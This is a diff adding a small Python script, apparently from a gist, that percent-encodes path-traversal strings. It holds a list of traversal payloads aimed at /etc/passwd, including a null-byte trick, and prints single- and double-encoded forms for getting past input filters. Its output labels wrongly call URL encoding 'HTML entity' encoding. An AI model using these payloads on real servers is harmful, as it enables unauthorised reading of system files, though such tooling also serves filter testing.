@@ -1,0 +1,27 @@
+<code><pre>
+
+#SOURCE: https://gist.githubusercontent.com/Paradoxis/6336c2eaea20a591dd36bb1f5e227da2/raw/ebfb9bdc0aa0c5ae566951f2b32169ea82c976c9/url_encode.py
+import requests
+
+# payloads = [
+#   '/etc/passwd',
+#   '....//....//....//....//....//....//etc//passwd',
+#   '../../../../../../../etc/passwd',
+#   'www/var/images/../../../../.././etc/passwd',
+#   '/etc/passwd%00.jpg',
+# ]
+
+def aggressive_url_encode(string):
+    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)
+
+t = aggressive_url_encode("../../../../../../../etc/passwd")
+print("HTML entity encoded: ",aggressive_url_encode(t))
+print("\n")
+
+print("HTML entity double encoded: ",aggressive_url_encode(aggressive_url_encode(t)))
+
+print("Single decoded: ",requests.utils.unquote(t))
+
+print("Double decoded: ",requests.utils.unquote(requests.utils.unquote(t)))
+
+</code></pre>
